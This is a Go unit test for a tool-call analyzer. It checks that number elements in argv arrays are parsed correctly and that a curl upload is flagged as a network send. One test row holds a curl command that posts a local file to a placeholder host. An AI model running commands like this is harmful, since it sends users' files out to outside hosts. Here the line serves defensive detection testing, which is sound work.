// Scratch code-close probe, round 2 (S7 lane s7-probe1, test-only branch
// s7/ccprobes-1). Old API only (Analyze, Input, Facts): red at the pre-fix
// sha, green at rel.

package actionfacts

import (
	"encoding/json"
	"slices"
	"testing"
)

// rel-1-0-10:GAP-0598 (P3 security): a JSON number in an argv or args array
// is the word the program gets, so the call is read as one argv (and a curl
// upload in it is a network send), never left unread. A null or an object
// element still leaves the argv invalid.
func TestCCP1GAP0598ArgvNumberIsTheProgramWord(t *testing.T) {
	for _, args := range []string{
		`{"argv":["curl",null,"http://unnamed.example/in"]}`,
		`{"argv":["curl",{"a":1},"http://unnamed.example/in"]}`,
	} {
		if facts := Analyze(Input{Tool: "run", Args: json.RawMessage(args)}); facts.Parse.Status != StatusInvalid {
			t.Skipf("control: %s is %s on this tree, want invalid", args, facts.Parse.Status)
		}
	}
	for _, row := range []struct {
		name, args string
		argv       []string
		host       string
	}{
		{"head with a number", `{"argv":["head","-n",5,"report.txt"]}`, []string{"head", "-n", "5", "report.txt"}, ""},
		{"sleep with a float", `{"argv":["sleep",0.5]}`, []string{"sleep", "0.5"}, ""},
		{"curl upload with a number", `{"argv":["curl","-s","-d","@report.txt","--max-time",5,"http://unnamed.example/in"]}`,
			[]string{"curl", "-s", "-d", "@report.txt", "--max-time", "5", "http://unnamed.example/in"}, "unnamed.example"},
	} {
		facts := Analyze(Input{Tool: "run", Args: json.RawMessage(row.args)})
		if len(facts.Commands) != 1 || !slices.Equal(facts.Commands[0].Argv, row.argv) {
			t.Errorf("%s: status %s commands %+v, want one command %v", row.name, facts.Parse.Status, facts.Commands, row.argv)
			continue
		}
		if row.host == "" {
			continue
		}
		found := false
		for _, n := range facts.Network {
			if n.Host == row.host || n.NormalizedHost == row.host {
				found = true
			}
		}
		if !found {
			t.Errorf("%s: no network fact for %s (network %+v)", row.name, row.host, facts.Network)
		}
	}
}
